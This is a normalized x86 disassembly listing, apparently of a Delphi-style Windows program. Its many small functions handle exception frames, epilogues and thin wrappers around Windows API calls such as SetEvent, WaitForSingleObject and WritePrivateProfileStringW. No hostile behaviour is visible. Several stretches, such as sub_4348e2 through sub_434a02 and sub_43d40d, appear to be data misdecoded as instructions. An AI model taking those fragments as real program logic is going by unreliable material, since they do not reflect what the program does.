jmp sub_4488a4
sub_42ee6c
mov ebx 0x1
call sub_448cfc
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_42eecf
jmp sub_4488a4
sub_42eed4
mov ebx 0x80030103
call sub_448cfc
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_42ef52
jmp sub_4488a4
sub_42ef57
mov ebx 0x80030009
call sub_448cfc
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_42efb5
jmp sub_4488a4
sub_42efba
mov ebx 0x8000ffff
call sub_448cfc
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_42f18b
jmp sub_448b58
sub_42f19c
jmp sub_4488a4
sub_42f1a1
mov [ ebp - 0x4 ] 0x8000ffff
call sub_448cfc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f1ca
lea eax [ ebp + 0xc ]
call sub_44b8d8
retn
sub_42f1c3
jmp sub_448b58
sub_42f1ca
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_42f1d8
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_42f1e4
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_42f1f0
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_42f1fc
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_42f26b
jmp sub_4488a4
sub_42f270
mov esi 0x8000ffff
call sub_448cfc
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_42f284
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_42f2f1
jmp sub_448b58
sub_42f2f8
mov eax [ rw-data ]
call sub_4481b0
pop edi
pop esi
pop ebx
pop ebp
retn
sub_42f308
call sub_423ce8
retn
sub_42f588
jmp sub_448b58
sub_42f58f
pop ebp
retn
sub_42f61d
jmp sub_448b58
sub_42f624
pop ebp
retn
sub_42f6ac
jmp sub_448b58
sub_42f6b3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f798
jmp sub_448b58
sub_42f79f
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42f940
jmp sub_448b58
sub_42f947
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42fa49
jmp sub_448b58
sub_42fa50
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42fc20
jmp sub_448b58
sub_42fc27
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42fd02
jmp sub_448b58
sub_42fd09
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42fe10
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
mov ecx 0x0
call sub_449f58
pop esi
pop ebx
retn
sub_42fef5
jmp sub_448b58
sub_42fefc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42ff4c
jmp sub_448b58
sub_42ff53
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42ffa9
jmp sub_448b58
sub_42ffb0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_430000
jmp sub_448b58
sub_430007
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43019e
jmp sub_448b58
sub_4301a5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43029a
jmp sub_448b58
sub_4302a1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4303b0
jmp sub_448b58
sub_4303b7
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4304b6
jmp sub_448b58
sub_4304bd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4307d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_43f250
pop esi
pop ebx
retn
sub_430a7e
jmp sub_448b58
sub_430a85
pop ebp
retn
sub_430a88
sub [ rw-data ] 0x1
retn
sub_430ae5
jmp sub_448b58
sub_430aec
pop ebp
retn
sub_430af0
sub [ rw-data ] 0x1
retn
sub_430c73
jmp sub_448b58
sub_430c7a
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_430f5d
jmp sub_448b58
sub_430f64
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_431140
jmp sub_448b58
sub_431147
pop ebp
retn
sub_43114c
sub [ rw-data ] 0x1
retn
sub_431179
jmp sub_448b58
sub_431180
pop ebp
retn
sub_431184
sub [ rw-data ] 0x1
retn
sub_431506
jmp sub_448b58
sub_43150d
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_431574
jmp sub_448b58
sub_43157b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
j_sub_4489d0#5
jmp sub_4489d0
sub_431655
jmp sub_448b58
sub_43165c
fld [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
j_sub_4489d0#2
jmp sub_4489d0
sub_43170d
jmp sub_448b58
sub_431714
fld [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
j_sub_4489d0#6
jmp sub_4489d0
sub_4317c5
jmp sub_448b58
sub_4317cc
fld [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
j_sub_4489d0
jmp sub_4489d0
sub_43187d
jmp sub_448b58
sub_431884
fld [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4318e7
jmp sub_448b58
sub_4318ee
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_431949
jmp sub_448b58
sub_431950
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_4319ab
jmp sub_448b58
sub_4319b2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_431a13
jmp sub_448b58
sub_431a1a
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_431abe
jmp sub_448b58
sub_431ac5
movzx eax [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_431c6c
jmp sub_448b58
sub_431c8e
jmp sub_448b58
sub_431c95
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_431df6
jmp sub_448b58
sub_431e25
jmp sub_448b58
sub_431e2c
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_431f0b
jmp sub_448b58
sub_431f12
pop ebx
mov esp ebp
pop ebp
retn
sub_4320cb
jmp sub_448b58
sub_4320d2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4320ef
mov eax [ ebp - 0x8 ]
call sub_4474a8
retn
sub_4320e8
jmp sub_448b58
sub_4320ef
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43210c
lea eax [ ebp - 0xc ]
call j_sub_449348
retn
sub_432105
jmp sub_448b58
sub_43210c
pop ebx
mov esp ebp
pop ebp
retn
sub_4321aa
jmp sub_448b58
sub_4321b1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4321ce
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_4321c7
jmp sub_448b58
sub_4321ce
pop ebx
pop ecx
pop ebp
retn
sub_432260
jmp sub_448b58
sub_43236f
jmp sub_448b58
sub_432376
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432393
mov eax [ ebp - 0x10 ]
call sub_4481b0
retn
sub_43238c
jmp sub_448b58
sub_432393
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4323b5
lea eax [ ebp - 0x20 ]
mov edx 0x4
call j_sub_44936c
retn
sub_4323ae
jmp sub_448b58
sub_4323b5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_432450
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_449db8
push eax
push 0x0
push 0x0
push 0x0
call WritePrivateProfileStringW
pop ebx
retn
sub_4324a8
jmp sub_448b58
sub_4324af
pop ebp
retn
sub_4324b4
sub [ rw-data ] 0x1
retn
sub_432628
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_4246e8
retn
sub_43265c
mov eax [ eax + 0x4 ]
call sub_424590
retn
sub_43268d
jmp sub_448b58
sub_432694
pop ebp
retn
sub_432698
sub [ rw-data ] 0x1
retn
sub_432739
mov [ esi ] cl
0xfc0000ff 0x4e88
sub_4327e5
inc [ eax ]
add ah bh
mov [ esi ] cl
sar bh 0x0
add ah bh
mov [ esi ] cl
sar edi 0x0
add ah bh
mov [ esi ] cl
retn 0xff
sub_432825
jmp sub_448b58
sub_43282c
pop ebp
retn
sub_432830
sub [ rw-data ] 0x1
retn
sub_432a64
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_432a74
push ecx
mov edx eax
and dx 0xffff
mov [ esp ] dx
shr eax 0x10
mov [ esp + 0x2 ] ax
mov eax [ esp ]
pop edx
retn
sub_432b10
mov edx [ eax + 0x8 ]
cmp edx [ eax ]
jle r-xdata
mov al 0x1
retn
mov edx [ eax + 0xc ]
cmp edx [ eax + 0x4 ]
jle r-xdata
xor eax eax
retn
sub_432bad
jmp sub_448b58
sub_432bb4
pop ebp
retn
sub_432bb8
sub [ rw-data ] 0x1
retn
sub_432ff0
retn
sub_432ff4
retn
sub_4331a8
mov eax [ eax + 0x4 ]
push eax
call SetEvent
retn
sub_4331b4
mov eax [ eax + 0x4 ]
push eax
call ResetEvent
retn
sub_433230
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_43323c
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_433248
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
pop ebp
retn 0x4
sub_433258
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_433560
pop ebp
retn 0x4
sub_433268
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_433574
pop ebp
retn 0x4
sub_433278
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
call sub_433460
neg al
sbb eax eax
pop ebp
retn 0xc
sub_4332dd
jmp sub_448b58
sub_4332e4
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_4333c6
jmp sub_448b58
sub_4333cd
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_433454
jmp sub_448b58
sub_433541
jmp sub_448b58
sub_433558
and edx 0xfffffffe
mov [ eax ] edx
retn
sub_433560
call sub_433294
test eax eax
je r-xdata
retn
mov eax [ eax + 0x8 ]
push eax
call SetEvent
sub_4335db
jmp sub_448b58
sub_4335e2
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_433778
retn
sub_433779
jmp sub_448b58
j_sub_433778
jmp sub_433778
sub_433780
pop ebp
retn
sub_433784
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_4335e8
sub_434679
add eax 0xffffffd4
jmp sub_43bf80
sub_434681
add eax 0xffffffd4
jmp sub_43be14
sub_434689
add eax 0xffffffd4
jmp sub_43bec0
sub_43469b
add [ esp + 0x4 ] 0xffffffd4
jmp sub_44b9ac
sub_4346a5
add [ esp + 0x4 ] 0xffffffd4
jmp sub_44b9c0
sub_4348e2
inc ebx
add [ ebx + ecx * 8 + 0x43 ] bh
add [ eax - 0x4bffbc35 ] ah

sub_4348ee
inc ebx
add ah dl

sub_4348f2
inc ebx
add ah bl

sub_4348f6
inc ebx
add al ah

sub_4348fa
inc ebx
add [ eax - 0x36 ] ah
inc ebx
add [ eax - 0x17ffbc36 ] ah
0x43
sub_434a02
inc ebx
add [ eax - 0x34 ] al
inc ebx
add [ eax - 0x34 ] bl
inc ebx
add [ eax - 0x34 ] ah
inc ebx
add al al
int3
sub_434b74
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
pop ebx
retn
sub_434c14
cmp ax 0x100
jae r-xdata
xor eax eax
retn
movzx eax al
bt [ edx ] eax
jb r-xdata
mov al 0x1
retn
sub_435008
cmp cl 0x1
jne r-xdata
call sub_434f0c
retn
call sub_4350d0
retn
sub_4350c4
jmp sub_448b58
sub_4350cb
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43518c
jmp sub_448b58
sub_435193
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43524e
jmp sub_448b58
sub_435255
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4353c1
jmp sub_448b58
sub_4353c8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_435569
jmp sub_448b58
sub_435570
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_435ab6
jmp sub_448b58
sub_435abd
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_435e64
jmp sub_448b58
sub_435e6b
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_435f24
jmp sub_448b58
sub_435f2b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4360c4
cmp [ eax ] 0x0
je r-xdata
retn
mov edx eax
neg edx
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax 0x2
retn
sub_4360e0
push esi
mov esi eax
add ecx ecx
xchg edx eax
call sub_4476cc
mov eax esi
pop esi
retn
sub_4361c0
jmp sub_448b58
sub_4361c7
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4362d8
jmp r-xdata
movzx ecx [ eax ]
cmp dx cx
jne r-xdata
test cx cx
jne r-xdata
retn
add eax 0x2
xor eax eax
retn
sub_4363d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_449ed8
pop esi
pop ebx
retn
sub_4363ec
push ebx
mov ebx eax
add ebx ebx
add ebx 0x4
mov eax ebx
call sub_44748c
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_436404
call sub_4363ec
retn
sub_43640c
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_436444
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_4474a8
sub_4366da
jmp sub_448b58
sub_4366e1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43675c
jmp sub_448b58
sub_436763
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43676c
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_447670
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_436b70
push ebx
push eax
lea eax [ ebp - 0x10 ]
mov ebx [ ebp - 0x4 ]
call sub_4499d8
pop eax
pop ebx
retn
sub_436cf4
cmp [ ebp - 0x24 ] 0x0
je r-xdata
retn
mov ax 0x2d
stosw [ edi ]
sub_436e7a
push esi
mov esi [ ebp - 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_4371d7
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_4371d7
sub_437288
jmp sub_448b58
sub_43728f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437334
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_449db8
mov edx esi
xor ecx ecx
call sub_437234
pop esi
pop ebx
retn
sub_437430
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_449db8
mov edx esi
mov cl 0x1
call sub_437234
pop esi
pop ebx
retn
sub_437978
jmp sub_448b58
sub_43797f
pop ecx
pop ebp
retn
sub_437be4
jmp sub_448b58
sub_437beb
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_437cf9
jmp sub_448b58
sub_437d00
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4384e1
jmp sub_448b58
sub_4384e8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_438584
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_438528
pop ebp
retn 0x8
sub_4385f7
jmp sub_448b58
sub_4385fe
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4386b8
jmp sub_448b58
sub_4386bf
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_438814
jmp sub_448b58
sub_43881b
movzx eax [ ebp - 0x11 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4388c2
jmp sub_448b58
sub_4388c9
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43895b
jmp sub_448b58
sub_438962
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_438a1f
jmp sub_448b58
sub_438a26
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_438e61
jmp sub_448b58
sub_438e68
movzx eax [ ebp - 0x11 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439156
jmp sub_448b58
sub_43915d
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43921a
jmp sub_448b58
sub_439221
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_439330
jmp sub_448b58
sub_439337
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43955b
jmp sub_448b58
sub_439562
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43960d
jmp sub_448b58
sub_439614
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4396b7
jmp sub_448b58
sub_4396be
pop esi
pop ecx
pop ebp
retn
sub_439907
jmp sub_448b58
sub_43990e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439994
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_439b4c
jmp sub_448b58
sub_439b53
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_439ce2
jmp sub_448b58
sub_439db0
jmp sub_448b58
sub_439e1c
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_439e7c
mov [ eax + 0x10 ] edx
retn
sub_439ecb
inc [ edx ]
add [ eax ] al
add [ 0xa00 ] cl
add [ eax ] al
add [ eax + 0x74001878 ] al
add eax 0xe281e8
add bl al
call sub_439e54
retn
sub_439fda
pop ebx
retn
sub_43a078
jmp sub_448b58
sub_43a07f
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43a088
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_448c38
sub_43a095
retn
sub_43a098
push ebp
mov ebp esp
call sub_439fdc
lea ecx [ ebp + 0x8 ]
add ecx 0x8
mov edx [ ebp + 0x8 ]
call sub_43a088
pop ebp
retn 0x4
sub_43a0b4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
retn
sub_43a14c
push ebx
mov ebx eax
mov eax ebx
call sub_43a0cc
movzx eax al
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_43a31f
jmp sub_448b58
sub_43a326
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43a3f2
jmp sub_448b58
sub_43a3f9
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_43a424
call sub_439b68
mov eax 0x1
call sub_44927c
sub_43a6e0
mov eax [ rw-data ]
mov [ eax ] rw-data
retn
sub_43a8c9
jmp sub_448b58
sub_43a8e6
jmp sub_448b58
sub_43a8ed
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_43a8fc
push 0x0
call MessageBeep
retn
sub_43aa03
jmp sub_448b58
sub_43aa0a
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43aaa8
jmp sub_448b58
sub_43aaaf
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_43aab8
call sub_43aa14
retn
sub_43ab8d
jmp sub_448b58
sub_43ab94
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43aba0
call sub_43aac0
retn
sub_43acb5
jmp sub_448b58
sub_43acbc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43ad97
jmp sub_448b58
sub_43ad9e
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ada8
call sub_43acc8
retn
sub_43aeb0
jmp sub_448b58
sub_43aeb7
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_43aec0
call sub_43adb0
retn
sub_43afac
jmp sub_448b58
sub_43afb3
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43b047
jmp sub_448b58
sub_43b04e
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43b126
jmp sub_448b58
sub_43b12d
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43b138
call sub_436320
retn
sub_43b140
call sub_4362f0
retn
sub_43b53a
jmp sub_448b58
sub_43b541
pop ebx
mov esp ebp
pop ebp
retn
sub_43b7ed
jmp sub_448b58
sub_43b7f4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43b91c
retn
sub_43bacf
jmp sub_448b58
sub_43bad6
pop ebx
mov esp ebp
pop ebp
retn
sub_43badc
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_43ba38
sub_43bbb8
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_43bbc4
xchg [ eax ] edx
mov eax edx
retn
sub_43bc2c
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
movzx eax [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_43bcc0
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_43bddc
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_43bdf4
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x10 ]
push eax
call WaitForSingleObject
retn
sub_43be04
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_43bfe8
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
retn
sub_43c093
jmp sub_448b58
sub_43c09a
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43c108
jmp sub_448b58
sub_43c10f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c12d
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_43c126
jmp sub_448b58
sub_43c12d
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_43c366
jmp sub_448b58
sub_43c36d
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43c3eb
jmp sub_448b58
sub_43c3f2
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43c4ee
jmp sub_448b58
sub_43c4f5
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43c595
jmp sub_448b58
sub_43c59c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43c735
jmp sub_448b58
sub_43c73c
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_43c9d8
jmp sub_448b58
sub_43c9df
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_43cb64
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
push edx
mov edx [ eax + 0x14 ]
push edx
mov eax [ eax + 0xc ]
push eax
call WideCharToMultiByte
retn
sub_43cba0
push 0x0
push 0x0
push ecx
push edx
mov edx [ eax + 0x10 ]
push edx
mov eax [ eax + 0xc ]
push eax
call MultiByteToWideChar
retn
sub_43cbd4
inc edx
imul edx [ eax + 0x8 ]
mov eax edx
retn
sub_43cbdc
mov eax edx
retn
sub_43cbe0
push ebx
mov ebx edx
push 0x0
mov eax ebx
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
pop ebx
retn
sub_43cc38
call sub_43cb64
retn
sub_43cc40
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_43cb7c
pop ebx
pop ebp
retn 0x8
sub_43cc58
call sub_43cba0
retn
sub_43cc60
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_43cbb4
pop ebx
pop ebp
retn 0x8
sub_43cc78
lea eax [ edx + edx * 2 ]
add eax 0x2
retn
sub_43cc80
mov eax edx
retn
sub_43ccc0
inc edx
lea eax [ edx + edx * 2 ]
retn
sub_43ccc8
lea eax [ edx + 0x1 ]
retn
sub_43ccfc
test dl dl
je r-xdata
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] 0x4
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_448694
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_43cd28
mov eax ecx
add eax eax
retn
sub_43cd4c
mov eax ecx
sar eax 0x1
jns r-xdata
retn
adc eax 0x0
sub_43cd78
inc edx
mov eax edx
add eax eax
retn
sub_43cd80
mov eax edx
sar eax 0x1
jns r-xdata
and edx 0x1
add eax edx
inc eax
retn
adc eax 0x0
sub_43d3cb
jmp sub_448b58
sub_43d3d2
pop ebp
retn
sub_43d3db
inc [ edx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] bh
add [ eax ] al
add [ eax ] al
cld
mov [ esi ] cl
retn
sub_43d40d
inc [ eax ]
add ah bh
mov [ esi ] cl
enter 0xff 0x0
cld
mov [ esi ] cl
leave
inc [ eax ]
add ah bh
mov [ esi ] cl
0xff
sub_43d427
add ah bh
mov [ esi ] cl

sub_43d42d
inc [ eax ]
add ah bh
mov [ esi ] cl
int3
sub_43d790
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_43d7f6
jmp sub_448b58
sub_43d7fd
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_43d862
jmp sub_448b58
sub_43d869
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_43d8ce
jmp sub_448b58
sub_43d8d5
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_43d93a
jmp sub_448b58
sub_43d941
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_43d9a6
jmp sub_448b58
sub_43d9ad
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_43da25
jmp sub_448b58
sub_43da2c
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_43da98
jmp sub_448b58
sub_43da9f
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_43db0a
jmp sub_448b58
sub_43db11
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_43db80
jmp sub_448b58
sub_43db87
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_43def9
jmp sub_448b58
sub_43df00
pop ebp
retn
sub_43df04
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_43dbbc
sub_43df15
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_43e6ae
jmp sub_448b58
sub_43e6b5
pop ecx
pop ebp
retn
sub_43e747
jmp sub_448b58
sub_43e74e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43e79e
jmp sub_448b58
sub_43e7a5
pop ecx
pop ebp
retn
sub_43e7f2
jmp sub_448b58
sub_43e7f9
pop ecx
pop ebp
retn
sub_43e88b
jmp sub_448b58
sub_43e892
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43e8e2
jmp sub_448b58
sub_43e8e9
pop ecx
pop ebp
retn
sub_43eb31
jmp sub_448b58
sub_43eb38
pop ebx
mov esp ebp
pop ebp
retn
sub_43ec4e
jmp sub_448b58
sub_43ec55
pop ecx
pop ebp
retn
sub_43ec58
push ebx
mov ebx eax
mov eax ebx
call sub_43ef08
mov [ ebx ] 0x1
pop ebx
retn
sub_43ef1c
push eax
call sub_43ef08
pop eax
retn
sub_43f17c
call sub_43f250
retn
sub_43f2f0
jmp sub_448b58
sub_43f2f7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43f33e
jmp sub_448b58
sub_43f345
pop ebx
pop ecx
pop ebp
retn
sub_43f38a
jmp sub_448b58
sub_43f391
pop ebx
pop ecx
